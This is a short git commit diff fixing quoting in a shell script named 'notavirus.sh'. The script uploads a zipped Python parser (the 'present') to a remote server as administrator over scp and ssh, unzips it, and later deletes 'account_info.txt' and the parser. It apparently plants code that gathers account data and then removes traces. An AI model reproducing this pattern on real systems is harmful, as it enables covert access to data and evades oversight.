a2e49af07df945ddc21514f452e187a890e7c489
Maya <77994029+mayasavino@users.noreply.github.com>
2023-12-04 23:52:02 -0700

    Update notavirus.sh
    debug

--- notavirus.sh
+++ notavirus.sh
@@ -3,8 +3,7 @@
 # bring present to db
 tar.exe -a -c -f present.zip db_parse.py
 scp C:\\Users\\Jerry\\Downloads\\present.zip administrator@12.34.56.70:/home/administrator
-ssh administrator@12.34.56.70 "
-cd /home/administrator
+ssh administrator@12.34.56.70 "cd /home/administrator"
 
 # unwrap present
 unzip -q present.zip
@@ -34,4 +33,3 @@ rm -f account_info.txt
 rm -f db_parse.py
 
 exit
-"
